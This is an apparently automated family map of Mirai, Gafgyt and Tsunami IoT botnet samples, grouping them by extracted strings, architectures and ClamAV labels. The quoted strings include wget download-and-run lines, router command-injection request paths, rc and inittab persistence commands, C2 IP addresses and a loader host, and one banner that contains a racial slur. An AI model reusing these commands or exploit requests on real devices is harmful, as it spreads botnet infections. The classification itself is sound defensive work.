# Family map: more_mirai_yara (447 files)

32 groups, 423 files grouped, 24 unclassified. Machine-readable twin: `families.json`.

Packed files are counted next to their unpacked sibling (`<md5>.unpacked`), so a variant with 50 files is roughly 25 real samples. "Strings" below are counted over files that have a string table; UPX-packed originals have none.

| group id | family | subfamily | files | arches | defining strings | conf |
|---|---|---|---|---|---|---|
| benign_test | benign | test programs / curl | 4 | RISCV:2, x86/LE-64:1, AARCH64:1 | `'Invoking calculate_mean as a `; `'Optimized Bubble sort complet`; `'Calculating sum of %d element` | medium |
| busybox_wget_exploit | gafgyt | busybox wget + Huawei/D-Link CGI exploits | 3 | ARM-32:2, MIPS/LE-32:1 | `'undefined'`; `'username'`; `'123456'` | low |
| boatnet_xor22 | mirai | boatnet (XOR-0x22 table, SNQUERY, netis banner) | 107 | ARM-32:36, x86/LE-32:16, MIPS/LE-32:12, MIPS/BE-32:11, PowerPC/BE:8, x86/LE-64:8, SuperH4:5, 68000:4, sparc:3, AARCH64:2, unknown(container/ELF-less):2 | `'\rFGT\rOKQA\rUCVAJFME"'`; `'\rFGT\rUCVAJFME"'`; `'\rQVCVWQ"'` | high |
| p_killermaps | mirai | p<arch> series (KillerMaps / "im in deep sorrow.") | 64 | ARM-32:20, x86/LE-32:13, MIPS/LE-32:8, MIPS/BE-32:7, x86/LE-64:4, PowerPC/BE:4, 68000:4, SuperH4:3, sparc:1 | `'[0clKillerKillerEXE] Killed p`; `'[0clKillerMaps] Killed Proces`; `'[0clKillerStat] Killed Proces` | high |
| xnxn | mirai | xnxn (!udpplain/!udpcustom, VMware check) | 32 | AARCH64:4, x86/LE-32:4, x86/LE-64:4, PowerPC/BE:4, MIPS/BE-32:4, SuperH4:4, Loongarch:2, 68000:2, RISCV:2, RISCV:2 | `'fd00e82a0a3d86af73deacaa9df16`; `'%x:%x:%x:%x:%x:%x:%d.%d.%d.%d`; `'%*s %31s %d %d %511[^\n]'` | high |
| demons | mirai | DEMONS (D-Link model list, vendor default creds) | 18 | ARM-32:7, MIPS/BE-32:2, MIPS/LE-32:2, PowerPC/BE:2, x86/LE-32:2, 68000:1, SuperH4:1, sparc:1 | `'wrgn39_dlob.hans_dir645_V1'`; `'wrgac01_dlob.hans_dir865'`; `'wrgn39_dlob.hans_dir645'` | high |
| xor_wbyy | mirai | XOR table "wbYyC107" (ClamAV Malware.Mirai-9950761) | 16 | ARM-32:4, SuperH4:3, MIPS/LE-32:2, x86/LE-32:2, x86/LE-64:1, sparc:1, 68000:1, MIPS/BE-32:1, PowerPC/BE:1 | `'kf{bhjpl`wbkfgqlm'`; `'wbYyC107:6;6:'`; `'wfof`lnbgnjm'` | medium |
| josho_flood | mirai | Josho / udp_flood series | 14 | MIPS/BE-32:5, ARM-32:2, PowerPC/BE:2, SuperH4:2, 68000:1, x86/LE-32:1, MIPS/LE-32:1 | `'readdir'`; `'%*d: %64[0-9A-F]:%X %64[0-9A-`; `"[watch_time] started: ('%d') ` | high |
| nuclear | mirai | nuclear | 13 | ARM-32:4, x86/LE-32:2, 68000:1, MIPS/BE-32:1, MIPS/LE-32:1, PowerPC/BE:1, SuperH4:1, sparc:1, x86/LE-64:1 | `'raw.flameblox.com'`; `'HWCLVGAJ'`; `'QOACFOKL'` | high |
| flylegit | mirai | flylegit (honeypot detection, t.me/flylegit) | 13 | ARM-32:4, x86/LE-64:3, AARCH64:1, sparc:1, 68000:1, MIPS/BE-32:1, PowerPC/BE:1, x86/LE-32:1 | `'t.me/flylegit'`; `'%31s %31s %7s %11s'`; `'176.65.139.59'` | medium |
| iran_dg | mirai | iran / dg / bot (VmSize, SigCgt scanner) | 13 | MIPS/LE-32:8, MIPS/BE-32:5 |  | medium |
| mvchmod_dlr | mirai | plain arch names with "mv %s /%s/%s && chmod 777" (dlr-style dropper) | 10 | ARM-32:3, x86/LE-32:1, 68000:1, MIPS/BE-32:1, MIPS/LE-32:1, PowerPC/BE:1, sparc:1, x86/LE-64:1 | `'mv %s /%s/%s && chmod 777 /%s`; `'mkdir /%s/ && >/%s/%s && cd /` | high |
| cling_exploit_scanner | mirai | .cling persistence + exploit scanner | 9 | ARM-32:3, x86/LE-32:3, MIPS/LE-32:1, MIPS/BE-32:1, PowerPC/BE:1 | `'echo ::once:/usr/local/bin/.c`; `'echo /usr/local/bin/.cling >>`; `'echo /usr/local/bin/.cling >>` | low |
| stripped_sha256_set | mirai | stripped sha256-named builds (Mirai_Y_MTB) | 8 | unknown(container/ELF-less):4, MIPS/BE-32:2, ARM-32:1, x86/LE-32:1 |  | low |
| rival_killer | mirai | rival-neutralizer / kthread masquerade | 7 | ARM-32:3, MIPS/BE-32:1, PowerPC/BE:1, 68000:1, SuperH4:1 | `'/system/etc/install-recovery.`; `'/system/bin/install-recovery.`; `'boot hook install-recovery bi` | medium |
| frosted | mirai | FROSTED (anti-debug, ROBLOXSPAM) | 7 | ARM-32:4, MIPS/BE-32:1, MIPS/LE-32:1, x86/LE-64:1 | `'FROSTED IS HERE NIGGA'`; `'ROBLOXSPAM'`; `'[anti-debug] DEBUGGER DETECTE` | high |
| securecore | mirai | secure-core key | 2 | MIPS/LE-32:2 | `'A_2026_SECURE_CORE_BOT_KEY!'` | medium |
| mushi | mirai | mushi (shares DEMONS D-Link list) | 2 | MIPS/LE-32:2 | `'Failed to set executable perm`; `'nohup /bin/bash /tmp/self_res`; `' > /dev/null 2>&1\n    if [ $` | low |
| sysd_dropper | mirai | /etc/init.d/sysd persistence | 2 | MIPS/LE-32:1, x86/LE-64:1 | `'%*d: %64[0-9A-Fa-f]:%*x %*s %`; `'#!/bin/sh\n/usr/bin/.sh &\n'`; `'/tmp/.instance_lock'` | medium |
| miner_redtail | other | cryptominer (redtail/xmrig-like) | 16 | AARCH64:4, ARM-32:4, x86/LE-64:4, x86/LE-32:4 | `"decnet name support not inclu`; `'hwloc_bitmap_isincluded(obj->`; `'Overwriting duplicate indexes` | high |
| zbot_static | other | zbot (statically linked glibc, /tmp/.pz) | 11 | ARM-32:4, MIPS/BE-32:2, MIPS/LE-32:2, AARCH64:2, unknown(container/ELF-less):1 | `'GET /index.php?%s HTTP/1.1\r\`; `'cp /proc/self/exe %s 2>/dev/n`; `'GET /device.rsp?opt=user&list` | high |
| go_bot_a | other | Go-compiled bot, MIPS/ARM/x86_64 | 8 | ARM-32:3, MIPS/LE-64:2, MIPS/BE-32:2, x86/LE-64:1 | `'8/dev/null'`; `'SigEd25519 no Ed25519 collisi`; `'TLS 1.3, server CertificateVe` | low |
| dht_bep44_bot | other | DHT/BEP44 peer bot (Mozi/Hajime-like) | 4 | ARM-32:4 | `'ybndrfg8ejkmcpqxot1uwisza345h`; `'e1:q9:get_peers1:t2:'`; `'3:seqi%llde3:sig64:'` | low |
| udp_vse_tiny | other | tiny attack-module (UDP-VSE, MINECRAFT, TCP-FIVEM) | 4 | MIPS/BE-32:2, MIPS/LE-32:2 | `'212.43.149.186'`; `'TCP-HANDSHAKE'`; `'%s %s %d %d'` | low |
| mtab_manji | other | manji / nerv (mount-flag strings) | 4 | MIPS/LE-32:4 | `'nodiratime'`; `'/etc/mtab'`; `'noatime'` | low |
| static_bot_started | other | static glibc bot ("BOT STARTED", /tmp/.bot) | 3 | MIPS/LE-32:1, ARM-32:1, MIPS/BE-32:1 | `"linkval[0] == '/'"`; `'_dl_get_origin'`; `'diffie-hellman-group14-sha1,d` | medium |
| bottx | other | HTTP token bot (bot-tx-v1) | 2 | MIPS/BE-32:1, MIPS/LE-32:1 | `'Content-Type: application/x-w`; `'token=%s&sid=%s&nonce=%u&seq=`; `'method=getEndpoints&token='` | low |
| stun_probe | other | STUN probe (stun.cloudflare.com) | 2 | MIPS/LE-32:1, MIPS/BE-32:1 | `'stun.cloudflare.com'`; `'/proc/net/unix'` | low |
| go_bot_b | other | Go-compiled program (TLS 1.3, x86 + ARM) | 2 | x86/LE-32:1, ARM-32:1 |  | low |
| static_sk_bot | other | static glibc bot (/tmp/.sk /tmp/.se /tmp/.z) | 2 | AARCH64:1, ARM-32:1 | `'/tmp/.sk'`; `'/tmp/.se'` | low |
| tsun_net_series | tsunami | *net series (KTN/R6-LAG, OVH-STORM, RyMGang) | 12 | ARM-32:3, MIPS/LE-32:2, x86/LE-32:2, SuperH4:1, PowerPC/BE:1, 68000:1, MIPS/BE-32:1, x86/LE-64:1 | `'%*d: %*s %*s %*x %*s %*s %*s `; `'DOMINATE Flooding %s for %d s`; `'Failed setting raw headers mo` | medium |
| tsun_holocaust | tsunami | Holocaust (OVHCRUSH, CPU-RAPE) | 9 | ARM-32:3, 68000:1, PowerPC/BE:1, sparc:1, x86/LE-32:1, MIPS/BE-32:1, MIPS/LE-32:1 | `'xmiwdio MOQWI"K (**(D8u9289d2`; `'9u123448u124au814d4x10'`; `'TSource Engine Query'` | medium |

## Groups

### benign_test - Not malware: curl, small calculators, UPX test binaries

Family: benign / test programs / curl. Files: 4 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

curl (97 functions), v07_arm_x64 and v10_riscv_x64 ("String reversed.", "Invoking calculate_mean") and the riscv UPX stub that is their packed form. Probably noise in the collection.

Strings: `'Invoking calculate_mean as a wrapper for array_average...' (2/3 in group, 2 in set)`; `'Optimized Bubble sort completed for %d elements.\n' (2/3 in group, 2 in set)`; `'Calculating sum of %d elements...\n' (2/3 in group, 2 in set)`; `'%d to the power of %d calculated.\n' (2/3 in group, 2 in set)`; `'Calculating standard deviation...' (2/3 in group, 2 in set)`; `'Starting array_sum calculation...' (2/3 in group, 2 in set)`; `'Target %d not found in array.\n' (2/3 in group, 2 in set)`; `'Prime check for %d finished.\n' (2/3 in group, 2 in set)`

### busybox_wget_exploit - Bot that wgets via /bin/busybox using CGI command injection

Family: gafgyt / busybox wget + Huawei/D-Link CGI exploits. Files: 3 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Strings: GET /login.cgi?cli=aa%20aa%27;wget..., GET /ping.cgi?pingIpAddress=, POST /ctrlt/DeviceUpgrade_1 (Huawei HG532, CVE-2017-17215), /bin/busybox wget http://37..., username. ClamAV Gafgyt-9939811 on the MIPS build and Mirai-9760303 on the ARM build, so labels disagree. Androidish strings on the third (/system/bin/app_process).

Strings: `'undefined' (3/3 in group, 3 in set)`; `'username' (2/3 in group, 2 in set)`; `'123456' (2/3 in group, 4 in set)`

### boatnet_xor22 - boatnet / "Self Rep NeTiS" Mirai fork, XOR 0x22 config table

Family: mirai / boatnet (XOR-0x22 table, SNQUERY, netis banner). Files: 107 (43 UPX originals with an unpacked sibling in the set). Confidence: high.

Stock Mirai layout with a table encoded by single-byte XOR 0x22 (decodes to /proc, /dev, killer and scanner words). Carries a Source-engine query probe (SNQUERY), an SSDP M-SEARCH flood and the banner "Self Rep Fucking NeTiS and Thisity..." (the netis router backdoor, port 53413, is the spread vector). ClamAV: Dropper.Mirai-7136013 (packed boatnet.*) and Trojan.Mirai-7100807/6981989. About half the entries are UPX originals whose unpacked sibling sits in the same group. The m-p.s-l.dick, miniiupnpd and upnnpd names are renamed copies of the same build. Sub-variation exists (GLVGP" table entries in 33 of ~53 stringed files) but no clean split.

Strings: `'\rFGT\rOKQA\rUCVAJFME"' (49/59 in group, 49 in set)`; `'\rFGT\rUCVAJFME"' (49/59 in group, 49 in set)`; `'\rQVCVWQ"' (51/59 in group, 51 in set)`; `'\rRPMA\r"' (51/59 in group, 51 in set)`; `'\rGVA\rFGDCWNV\rUCVAJFME"' (47/59 in group, 47 in set)`; `'\rQ@KL\rUCVAJFME"' (47/59 in group, 47 in set)`; `'\rGVA\rUCVAJFME"' (47/59 in group, 47 in set)`; `'\r@KL\rUCVAJFME"' (47/59 in group, 47 in set)`

### p_killermaps - p-series Mirai with /proc killer (KillerMaps/KillerEXE/KillerStat)

Family: mirai / p<arch> series (KillerMaps / "im in deep sorrow."). Files: 64 (16 UPX originals with an unpacked sibling in the set). Confidence: high.

Names pmips, parm5, px86_i686, pm68k and so on. Strings "[0clKillerMaps] Killed Process: %s, PID: %d", "[0clKillerKillerEXE] ...", "[0clKillerStat] ..." (killer that walks /proc/<pid>/maps, exe and stat), "im in deep sorrow." and /dev/watchdog handling. XOR-0x22 table again, so it is a sibling of boatnet but the killer strings are exclusive to this group. ClamAV Trojan.Mirai-9858729. Many entries are UPX originals (parm5/parm6/parm7 with 4-5 functions) linked to their unpacked sibling.

Strings: `'[0clKillerKillerEXE] Killed process: %s, PID: %d\n' (48/52 in group, 48 in set)`; `'[0clKillerMaps] Killed Process: %s, PID: %d\n' (48/52 in group, 48 in set)`; `'[0clKillerStat] Killed Process: %s, PID: %d\n' (40/52 in group, 40 in set)`; `'im in deep sorrow.' (38/52 in group, 38 in set)`; `'cmdline' (40/52 in group, 41 in set)`; `'/proc/%d/maps' (48/52 in group, 53 in set)`; `' HTTP/1.1\r\nHost: ' (21/52 in group, 24 in set)`; `'abcdefghijklmnopqrstuvw012345678' (42/52 in group, 52 in set)`

### xnxn - xnxnxnxnxnxnxnxn<arch>xnxn: Mirai-derived bot with !-prefixed attack commands

Family: mirai / xnxn (!udpplain/!udpcustom, VMware check). Files: 32 (10 UPX originals with an unpacked sibling in the set). Confidence: high.

Files named xnxnxnxnxnxnxnxn<arch>xnxn (12 arches incl. riscv32/64, loongarch64, sh2, aarch64) plus unnamed md5 siblings. Attack commands use a "!" prefix (!udpplain, !udpcustom, !http, !icmp) and key=value parameters (srcport=, payload=, psize=, gport=, proto=). Refuses to run in VMware (/sys/class/dmi/id/product_name), single-instance lock /tmp/.bot_lock, a 32-hex-char string fd00e82a... and a long hex blob. Yara tags Linux_Botnet_Generic_AttackCmdParams/HTTPFlood/BusyboxTelnetSpread/KthreadMasquerade fire on all of them. ClamAV Trojan.Mirai-10056451.

Strings: `'fd00e82a0a3d86af73deacaa9df16432' (20/22 in group, 20 in set)`; `'%x:%x:%x:%x:%x:%x:%d.%d.%d.%d' (22/22 in group, 23 in set)`; `'%*s %31s %d %d %511[^\n]' (22/22 in group, 23 in set)`; `'%x:%x:%x:%x:%x:%x:%x:%x' (22/22 in group, 23 in set)`; `'%*s %31s %d %511[^\n]' (22/22 in group, 23 in set)`; `'/tmp/.bot_lock' (18/22 in group, 18 in set)`; `'!udpcustom' (22/22 in group, 22 in set)`; `'!udpplain' (22/22 in group, 22 in set)`

### demons - DEMONS.<arch> Mirai build with D-Link model strings and vendor passwords

Family: mirai / DEMONS (D-Link model list, vendor default creds). Files: 18 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

DEMONS.* for 11 arches (some duplicated). Embedded router model names (wrgn23_dlwbr_dir600b, wrgac01_dlob.hans_dir865, dap2555, dvr...) and a vendor credential list (dhs3pms, gvt12345, ahetzip8, awind5885, ROOT500, hagpolm1, zhone, telecomadmin, 88888888). C2 IPs 176.65.148.100 and 84.200.24.238. XOR table with "{6=:{6!" style entries. ClamAV Dropper.Mirai-7135828. The model list is also in mushi, which makes DEMONS the likely ancestor of that build.

Strings: `'wrgn39_dlob.hans_dir645_V1' (14/18 in group, 14 in set)`; `'wrgac01_dlob.hans_dir865' (14/18 in group, 14 in set)`; `'wrgn39_dlob.hans_dir645' (14/18 in group, 14 in set)`; `'wapnd03cm_dkbs_dap2555' (12/18 in group, 12 in set)`; `'wapnd04cm_dkbs_dap3525' (12/18 in group, 12 in set)`; `'wapnd15_dlob_dap1522b' (14/18 in group, 14 in set)`; `"<<< %s(un='%s') = %u" (14/18 in group, 14 in set)`; `'wrgn23_dlwbr_dir300b' (14/18 in group, 14 in set)`

### xor_wbyy - Mirai variant with a different XOR key (wbYyC107..., f;wfomfw)

Family: mirai / XOR table "wbYyC107" (ClamAV Malware.Mirai-9950761). Files: 16 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

Table decodes with a key different from the 0x22 builds (strings like wbYyC107:6;6:, 2332`kjm, L{kotPD;, f;wfomfw). 10 distinct arches including x86_64, sh4, sparc and m68k. ClamAV Malware.Mirai-9950761. Three small stripped members (sh4 x2 and the PPC/MIPS pair around azsxd.mpsl) were added by non-library code similarity 0.3 to 0.5 and ClamAV so are less certain.

Strings: `'kf{bhjpl`wbkfgqlm' (10/16 in group, 10 in set)`; `'wbYyC107:6;6:' (10/16 in group, 10 in set)`; `'wfof`lnbgnjm' (8/16 in group, 8 in set)`; `'bgnjmwfof`ln' (10/16 in group, 10 in set)`; `'wfomfwbgnjm' (10/16 in group, 10 in set)`; `'wpdljmdlm' (10/16 in group, 10 in set)`; `'rae44232' (10/16 in group, 10 in set)`; `'P1eDrMEp' (10/16 in group, 10 in set)`

### josho_flood - Josho.* and plain-name builds with [udp_plain_flood] logging and "[killer] killed mirai"

Family: mirai / Josho / udp_flood series. Files: 14 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

Debug-style log lines such as "[udp_plain_flood] socket() failed", "[psh_ack_flood] started", "[icmp_flood] setsockopt() failed", "[killer] killed: %s (pid: %d)" and "killed mirai". Names Josho.ppc/sh4 and generic mips/mpsl/ppc/x86/arm6/arm7/m68k/sh4. Static uClibc loader with dl-error strings. ClamAV Dropper.Mirai-7135890. A hard-coded IP 94.26.106.197 appears in the x86 build.

Strings: `'readdir' (12/14 in group, 12 in set)`; `'%*d: %64[0-9A-F]:%X %64[0-9A-F]:%X %*s %*s %*s %d' (6/14 in group, 6 in set)`; `"[watch_time] started: ('%d') \| seconds: ('%d')\n" (11/14 in group, 11 in set)`; `"[watch_time] kill() pid: ('%d'), exit()\n" (11/14 in group, 11 in set)`; `"[tcpbypass_flood] started: ('%d')\n" (10/14 in group, 10 in set)`; `"[udp_plain_flood] started: ('%d')\n" (10/14 in group, 10 in set)`; `'[udp_plain_flood] socket() failed' (9/14 in group, 9 in set)`; `'\nModules for application (%p):\n' (9/14 in group, 9 in set)`

### nuclear - nuclear.<arch> Mirai fork with raw.flameblox.com loader

Family: mirai / nuclear. Files: 13 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

nuclear.* across 13 arches. Loader host raw.flameblox.com with ftpget, Valve "TSource Engine Query" flood, the same XOR table family as boatnet (QOACFOKL, HWCLVGAJ, QWRRMPV) and the SNQUERY/ssdp/netis strings. Closest to boatnet at code level (shared libc and attack set), distinguished by the loader host. ClamAV Dropper.Mirai-7135966 (arm7 -7135925, ppc -7135957).

Strings: `'raw.flameblox.com' (12/13 in group, 12 in set)`; `'HWCLVGAJ' (8/13 in group, 8 in set)`; `'QOACFOKL' (8/13 in group, 8 in set)`; `'1.1.1.1' (6/13 in group, 6 in set)`; `'QWRRMPV' (8/13 in group, 8 in set)`; `'ZOJFKRA' (8/13 in group, 8 in set)`; `'RCQQUMPF' (8/13 in group, 9 in set)`; `'FGDCWNV' (8/13 in group, 9 in set)`

### flylegit - Mirai-derived bot with honeypot check and t.me/flylegit banner

Family: mirai / flylegit (honeypot detection, t.me/flylegit). Files: 13 (1 UPX originals with an unpacked sibling in the set). Confidence: medium.

Contains t.me/flylegit, the message "Looks like you are a honeypot", C2 176.65.139.59, "udpplain" and a "%31s %31s %7s %11s" command parser plus "pong %s". Arch tokens (armv4l..armv7l) in the strings suggest a downloader stub. Covers files named boatnet.m68k/mipsrouter/powerpc but those names are misleading: the code is not the boatnet XOR build. Command syntax resembles xnxn (pong %s, key=value) so a shared lineage is plausible but the strings do not overlap enough to merge. ClamAV Mirai-8041698, Gafgyt-7782058 and Mirai-10012200 (inconsistent).

Strings: `'t.me/flylegit' (12/12 in group, 12 in set)`; `'%31s %31s %7s %11s' (8/12 in group, 8 in set)`; `'176.65.139.59' (7/12 in group, 7 in set)`; `'udpplain' (8/12 in group, 8 in set)`

### iran_dg - iran.* / dg.* MIPS Mirai variant that reads /proc/<pid>/status

Family: mirai / iran / dg / bot (VmSize, SigCgt scanner). Files: 13 (1 UPX originals with an unpacked sibling in the set). Confidence: medium.

MIPS only (BE and LE). Strings VmSize:, SigCgt:, /proc/%d/task/%d/children and /proc/%s/fd/0 point to a process-inspection killer. ClamAV Mirai-8041698/10059029. bot.mips and bot.mpsl are placed here only by ClamAV signature and weak code similarity (0.35 to 0.41 non-library score), so treat them as low confidence. wife.mpsl is a UPX original tied to its sibling.

### mvchmod_dlr - arm, arm5, arm7, i686, mips, mipsel, powerpc, sparc, m68k, x86_64 sharing a dropper that moves itself into a writable dir

Family: mirai / plain arch names with "mv %s /%s/%s && chmod 777" (dlr-style dropper). Files: 10 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

Plain architecture names. Self-relocation commands "mv %s /%s/%s && chmod 777 /%s/..." and "mkdir /%s/ && >/%s/%s && cd /%s ...". ClamAV Trojan.Mirai-9854559. Compact build (127-239 functions).

Strings: `'mv %s /%s/%s && chmod 777 /%s/%s >/dev/null' (10/10 in group, 10 in set)`; `'mkdir /%s/ && >/%s/%s && cd /%s/ >/dev/null' (10/10 in group, 10 in set)`

### cling_exploit_scanner - Dropper that appends .cling to rc scripts and scans with router exploits

Family: mirai / .cling persistence + exploit scanner. Files: 9 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

Two sub-sets: five builds with hard-coded server IPs (5.39.72.109, 77.72.169.212/213, 185.125.180.70, 64.131.63.217) and persistence echo /root/.cling >> /etc/rc.d, and four that issue HTTP exploit requests (/device.rsp?opt=sys&cmd=, /tmUnblock.cgi (Linksys), /picsdesc.xml, /cgi-bin/shortcut_telnet, /shell?cd%20%2Ftmp). No ClamAV signature. Whether both sub-sets are one codebase is unverified.

Strings: `'echo ::once:/usr/local/bin/.cling >> /etc/inittab' (9/9 in group, 9 in set)`; `'echo /usr/local/bin/.cling >> /etc/rc.d/rc.boot' (9/9 in group, 9 in set)`; `'echo /usr/local/bin/.cling >> /etc/init.d/rcS' (9/9 in group, 9 in set)`; `'echo ::once:/root/.cling >> /etc/inittab' (9/9 in group, 9 in set)`; `'echo /root/.cling >> /etc/rc.d/rc.boot' (9/9 in group, 9 in set)`; `'echo /root/.cling >> /etc/init.d/rcS' (9/9 in group, 9 in set)`; `'chmod +x /usr/local/bin/.cling' (9/9 in group, 9 in set)`; `'mount --bind /tmp /proc/%d' (9/9 in group, 9 in set)`

### stripped_sha256_set - Four architectures of one stripped 200-230 function program with their .zip wrappers

Family: mirai / stripped sha256-named builds (Mirai_Y_MTB). Files: 8 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

sha256-named .elf plus .zip pairs for ARM (228), MIPS-BE (228 and 200) and x86 (200). No strings at all, hard to name. Shared yara hits: Trojan_Linux_Mirai_Y_MTB, ELF_Toriilike_persist, Generic_Threat_d94e1020. Non-library similarity between them 0.28 to 0.45.

### rival_killer - Mirai build that kills rivals and hides as kworker

Family: mirai / rival-neutralizer / kthread masquerade. Files: 7 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

Strings "Rival Neutralized: pid=%d", priority-rival, anti-hide, reload ok exec %s tag=%s, process names kworker/u8:0, kdevtmpfs and migration/0 (used as masquerade), /sys/fs/cgroup/unified, NFnhiFSDfdsfFSD. The m68k and sh4 members (82b509.., 918c81..) have no strings of this kind; they join on weak code similarity (0.25 to 0.34) plus identical yara tags (ELF_Toriilike_persist, ELF_IoT_Persistence_Hunt).

Strings: `'/system/etc/install-recovery.sh' (6/7 in group, 6 in set)`; `'/system/bin/install-recovery.sh' (6/7 in group, 6 in set)`; `'boot hook install-recovery bin' (6/7 in group, 6 in set)`; `'com.google.firestick.youtube' (7/7 in group, 7 in set)`; `'com.google.activision.elite' (6/7 in group, 6 in set)`; `'redirect cleared default c2' (6/7 in group, 6 in set)`; `'boot hook install-recovery' (6/7 in group, 6 in set)`; `'killed rival pid=%d exe=%s' (7/7 in group, 7 in set)`

### frosted - Mirai variant with "FROSTED IS HERE" banner and ptrace anti-debug

Family: mirai / FROSTED (anti-debug, ROBLOXSPAM). Files: 7 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

Strings "FROSTED IS HERE NIGGA", ROBLOXSPAM attack name, "[anti-debug] DEBUGGER DETECTED" and "[anti-debug] PTRACE DETECTED". Names include kkk.arm7 and chrome. ClamAV mostly clean (OK) with Mirai-7135925/7640640 on a few.

Strings: `'FROSTED IS HERE NIGGA' (7/7 in group, 7 in set)`; `'ROBLOXSPAM' (3/7 in group, 4 in set)`; `'[anti-debug] DEBUGGER DETECTED (%s) - EXITING\n' (5/7 in group, 7 in set)`; `'[anti-debug] PTRACE DETECTED - EXITING\n' (5/7 in group, 7 in set)`

### securecore - Mirai build with embedded key A_2026_SECURE_CORE_BOT_KEY!

Family: mirai / secure-core key. Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

Two MIPS-LE builds that share the literal A_2026_SECURE_CORE_BOT_KEY! (mipsel plus an md5-named copy). The key suggests a private fork that encrypts its C2 traffic. Not seen elsewhere in the set. Only two files so the identity is firm but the group is thin.

Strings: `'A_2026_SECURE_CORE_BOT_KEY!' (2/2 in group, 2 in set)`

### mushi - mushi-named bot: /etc/init.d/mushi_%ld persistence

Family: mirai / mushi (shares DEMONS D-Link list). Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

bin.mipsel and an md5-named twin (MIPS LE). Persistence under /etc/init.d/mushi_%ld, test credentials (1234abc, 228818), "Packet Type: %u". Carries the same D-Link model list as DEMONS, so probably a fork of it. ClamAV Dropper.Mirai-7355719.

Strings: `'Failed to set executable permissions or update runlevels\n' (2/2 in group, 2 in set)`; `'nohup /bin/bash /tmp/self_restart.sh > /dev/null 2>&1 &' (2/2 in group, 2 in set)`; `' > /dev/null 2>&1\n    if [ $? -ne 0 ]; then\n        ' (2/2 in group, 2 in set)`; `' &\n    fi\n    sleep 1  # Check every 1 second\ndone\n' (2/2 in group, 2 in set)`; `'# Description:       Start my_service at boot time\n' (2/2 in group, 2 in set)`; `'Another instance is already running. Terminating...' (2/2 in group, 2 in set)`; `'systemctl daemon-reload && systemctl enable %s' (2/2 in group, 2 in set)`; `'Received termination command. Terminating...' (2/2 in group, 2 in set)`

### sysd_dropper - Mirai-like dropper with sysd init script

Family: mirai / /etc/init.d/sysd persistence. Files: 2 (0 UPX originals with an unpacked sibling in the set). Confidence: medium.

bin.x86_64 and an md5-named MIPS copy. Copies itself to /usr/bin/.sh and /etc/init.d/sysd, reads /proc/net/tcp6 and socket inodes. ClamAV Trojan.Mirai-10056463.

Strings: `'%*d: %64[0-9A-Fa-f]:%*x %*s %*s %*s %*s %*s %*s %u' (2/2 in group, 2 in set)`; `'#!/bin/sh\n/usr/bin/.sh &\n' (2/2 in group, 2 in set)`; `'/tmp/.instance_lock' (2/2 in group, 2 in set)`; `'/etc/rc2.d/S99sysd' (2/2 in group, 2 in set)`; `'cp %s /usr/bin/.sh' (2/2 in group, 2 in set)`; `'/etc/init.d/sysd' (2/2 in group, 2 in set)`; `'/usr/bin/.sh &\n' (2/2 in group, 2 in set)`; `'/proc/net/tcp6' (2/2 in group, 2 in set)`

### miner_redtail - Statically linked miner with hwloc, libuv and OpenSSL, build path /var/build/redtail

Family: other / cryptominer (redtail/xmrig-like). Files: 16 (8 UPX originals with an unpacked sibling in the set). Confidence: high.

Large (4000-8000 functions) binaries built under /var/build/redtail/scripts with hwloc topology strings, libuv, DTLS/OpenSSL and a JSON-RPC keepalive. No botnet attack strings. These are cryptominer payloads (redtail family by build path), half are UPX originals tied to the unpacked copy.

Strings: `"decnet name support not included, '%s' cannot be translated\n" (8/8 in group, 8 in set)`; `'hwloc_bitmap_isincluded(obj->nodeset, obj->complete_nodeset)' (8/8 in group, 8 in set)`; `'Overwriting duplicate indexes attribute with last occurence\n' (8/8 in group, 8 in set)`; `'Invalid index interleaving generates duplicate index values\n' (8/8 in group, 8 in set)`; `'hwloc/xml/export/v1: failed to allocated logical_to_v2array\n' (8/8 in group, 8 in set)`; `'hwloc_bitmap_isequal(topology->allowed_cpuset, obj->cpuset)' (8/8 in group, 8 in set)`; `'inbound/outbound not supported on %s when reading savefiles' (8/8 in group, 8 in set)`; `"[hwloc/memtiers] failed to allocated forced tiers' nodeset\n" (8/8 in group, 8 in set)`

### zbot_static - Static glibc bot that downloads bot.%s and can load zbot.ko

Family: other / zbot (statically linked glibc, /tmp/.pz). Files: 11 (0 UPX originals with an unpacked sibling in the set). Confidence: high.

Static glibc images of 1500+ functions. Strings: wget -q http://%s:8080/bot.%s -O /tmp/.pz, StatusAndSupportPingIPAddr=%s&StatusAndSupportRunPing=1 and /data/statussupport_diagnostic_ping.cgi (router ping injection), insmod /tmp/zbot.ko, /tmp/.zl.%d, /tmp/.k, UPnP SOAP POST /upnp/control/WANIPConn1 and crontab persistence. Archives (.zip) with the same sha256 stem are included with their .elf child. Not Mirai/Gafgyt by string content.

Strings: `'GET /index.php?%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' (10/10 in group, 10 in set)`; `'cp /proc/self/exe %s 2>/dev/null && chmod +x %s 2>/dev/null' (10/10 in group, 10 in set)`; `'GET /device.rsp?opt=user&list=.admin.{..}:\r\nHost: %s\r\n\r\n' (10/10 in group, 10 in set)`; `'GET /ftptest.cgi?loginuse=%s&loginpas=%s HTTP/1.0\r\n\r\n' (10/10 in group, 10 in set)`; `'[od_realtek] udp 9034 exec sent at %s:%d (resp=%d)\n' (10/10 in group, 10 in set)`; `'find / -perm -4000 -type f -exec %s \\; 2>/dev/null' (10/10 in group, 10 in set)`; `'todo=connectivity_test&ip_addr=%s&conn_type=ping' (10/10 in group, 10 in set)`; `'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' (10/10 in group, 10 in set)`

### go_bot_a - Same Go program for MIPS BE/LE, ARM and x86_64 (4400-4600 functions)

Family: other / Go-compiled bot, MIPS/ARM/x86_64. Files: 8 (0 UPX originals with an unpacked sibling in the set). Confidence: low.

